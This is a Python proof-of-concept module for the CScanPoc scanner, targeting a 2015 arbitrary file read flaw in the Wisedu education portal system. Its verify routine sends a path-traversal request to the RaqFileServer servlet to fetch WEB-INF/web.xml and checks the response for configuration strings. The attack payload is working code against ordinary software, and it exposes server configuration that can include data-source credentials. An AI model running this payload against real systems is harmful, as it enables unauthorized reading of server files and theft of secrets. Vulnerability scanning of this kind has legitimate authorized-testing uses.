# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Wisedu_0002'  # 平台漏洞编号，留空
    name = '金智教育门户信息系统存在任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        金智教育是中国最大的教育信息化服务提供商。金智教育专注于教育信息化领域，致力于成为中国教育信息化服务的领航者，成为业界最具吸引力的事业平台，以通过信息化促进教育公平。
        江苏金智教育门户信息系统存在任意文件读取漏洞。
        /epstar/servlet/RaqFileServer?action=
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121332'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金智教育CMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1f51845c-ec3e-47d1-b53a-cf09ae493349'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2015-0121332
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = arg + "/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml"
            code, head, res, errcode, _ = hh.http(payload)

            if code == 200 and 'logConfig' in res and 'dataSource' in res:
                #security_info(payload+':Any reading ' )
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
